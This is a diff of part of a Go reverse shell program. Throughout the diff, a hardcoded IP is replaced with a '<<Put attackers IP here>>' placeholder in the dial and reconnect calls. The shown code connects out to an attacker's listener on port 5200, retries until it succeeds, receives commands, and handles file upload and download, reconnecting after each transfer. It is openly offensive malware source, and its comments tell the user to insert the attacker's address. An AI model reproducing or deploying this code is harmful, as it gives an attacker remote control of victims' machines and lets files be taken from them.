@@ -14,11 +14,11 @@ func main() {
 
 	command := ""
 
-	conn, err := net.DialTimeout("tcp", "192.168.1.12:5200", time.Duration(1*time.Second))
+	conn, err := net.DialTimeout("tcp", "<<Put attackers IP here>>:5200", time.Duration(1*time.Second)) //Put attackers ip in net.Dial()
 
 	if err != nil {
 		for {
-			conn, err = net.DialTimeout("tcp", "192.168.1.12:5200", time.Duration(1*time.Second))
+			conn, err = net.DialTimeout("tcp", "<<Put attackers IP here>>:5200", time.Duration(1*time.Second))//Put attackers ip in net.Dial()
 
 			if err == nil {
 				break
@@ -55,14 +55,14 @@ func shell(conn net.Conn, command string) {
 			conn.Close()
 			time.Sleep(1 * time.Second)
 
-			conn, _ = net.DialTimeout("tcp", "192.168.1.12:5200", time.Duration(1*time.Second))
+			conn, _ = net.DialTimeout("tcp", "<<Put attackers IP here>>:5200", time.Duration(1*time.Second))
 
 		} else if len(_command) >= 6 && _command[:6] == "upload" {
 			download_file(_command[7:], conn)
 			conn.Close()
 			time.Sleep(1 * time.Second)
 
-			conn, _ = net.DialTimeout("tcp", "192.168.1.12:5200", time.Duration(1*time.Second))
+			conn, _ = net.DialTimeout("tcp", "<<Put attackers IP here>>:5200", time.Duration(1*time.Second))
 
 		}
 
